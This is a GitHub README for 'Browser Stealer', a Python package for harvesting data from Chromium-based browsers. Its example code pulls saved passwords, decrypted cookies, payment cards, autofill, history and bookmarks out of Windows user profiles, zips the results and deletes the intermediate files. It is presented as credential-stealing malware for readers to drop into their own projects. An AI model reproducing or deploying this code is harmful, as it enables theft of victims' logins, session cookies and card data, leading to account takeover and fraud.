<h1 align="center">Browser Stealer<h1>

<p align="center">
  <img src="https://img.shields.io/github/languages/top/Josakko/browser_stealer" </a>
  <img src="https://img.shields.io/github/last-commit/Josakko/browser_stealer" </a>
  <img src="https://img.shields.io/github/stars/Josakko/browser_stealer" </a>
  <img src="https://img.shields.io/github/forks/Josakko/browser_stealer" </a>
</p>

<h4 align="center">
  <span style="color: #fff; font-weight: bold;">Browser Stealer</span>
  <span style="color: #fff; font-weight: normal;">v1.2.0</span>
</h4>

```
pip install browser_stealer
```

## Installation

Since module got removed from pypi you have to install it manually, to install it download `.whl` file (`browser_stealer-<version>-py3-none-any.whl`) from [here](https://github.com/Josakko/browser_stealer/releases), next open terminal on the location where you downloaded `browser_stealer-<version>-py3-none-any.whl` and run following command:
- *IMPORTANT* - Do not rename the downloaded file, that might prevent you from installing the module
  
```
pip install browser_stealer-<version>-py3-none-any.whl
```

After running the command you can import and use browser stealer in your own projects!

## Code Examples

Simple example for stealing data from profile "Default" of browsers: Chromium, Chrome, Opera, Opera GX, Brave, Edge
```py
import browser_stealer

browser_stealer.run()
```

Or if you want to add your own chromium based browser or other profiles for existing ones:

```py
import browser_stealer, os


def MyBrowser():
    browser_stealer.fetch_passwords(os.path.join(os.environ["USERPROFILE"], r"AppData\Local\%FOLDER%\%FOLDER%\User Data\Default\Login Data"), os.path.join(os.environ["USERPROFILE"], r"AppData\Local\%FOLDER%\%FOLDER%\User Data\Local State"))
    browser_stealer.decrypt_fetch_cookies(os.path.join(os.environ["USERPROFILE"], r"AppData\Local\%FOLDER%\%FOLDER%\User Data\Default\Network\Cookies"), os.path.join(os.environ["USERPROFILE"], r"AppData\Local\%FOLDER%\%FOLDER%\User Data\Local State"))
    browser_stealer.fetch_cookies(os.path.join(os.environ["USERPROFILE"], r"AppData\Local\%FOLDER%\%FOLDER%\User Data\Default\Network\Cookies"))
    browser_stealer.fetch_history(os.path.join(os.environ["USERPROFILE"], r"AppData\Local\%FOLDER%\%FOLDER%\User Data\Default\History"))
    browser_stealer.fetch_downloads(os.path.join(os.environ["USERPROFILE"], r"AppData\Local\%FOLDER%\%FOLDER%\User Data\Default\History"))
    browser_stealer.fetch_bookmarks(os.path.join(os.environ["USERPROFILE"], r"AppData\Local\%FOLDER%\%FOLDER%\User Data\Default\Bookmarks"))
    browser_stealer.fetch_payment(os.path.join(os.environ["USERPROFILE"], r"AppData\Local\%FOLDER%\%FOLDER%\User Data\Default\Web Data"), os.path.join(os.environ["USERPROFILE"], r"AppData\Local\%FOLDER%\%FOLDER%\User Data\Local State"))
    browser_stealer.fetch_autofill(os.path.join(os.environ["USERPROFILE"], r"AppData\Local\%FOLDER%\%FOLDER%\User Data\Default\Web Data"))

    browser_stealer.Utils().zip("MyBrowser.zip", ["autofill.txt", "cards.txt", "bookmarks.txt", "downloads.txt", "history.txt", "passwords.txt", "decrypted-cookies.txt", "cookies.txt"])
    browser_stealer.Utils().delete_files(["autofill.txt", "cards.txt", "bookmarks.txt", "downloads.txt", "history.txt", "passwords.txt", "decrypted-cookies.txt", "cookies.txt"])

MyBrowser()
```

In this example you have to replace `%FOLDER%\%FOLDER%` with one for your specific browser, so for example for chrome you would use `Google\Chrome`, and also replace `%PROFILE%` whit profile you want to target so for example you could replace it with `Default` if you want to target Default profile

## Need Help?

If you need help contact me on my [discord server](https:\\discord.gg\xgET5epJE6) or create [issue](https:\\github.com\Josakko\DiscordReverseShell\issues).

## Contributors

Big thanks to all of the amazing people (only me) who have helped by contributing to this project!
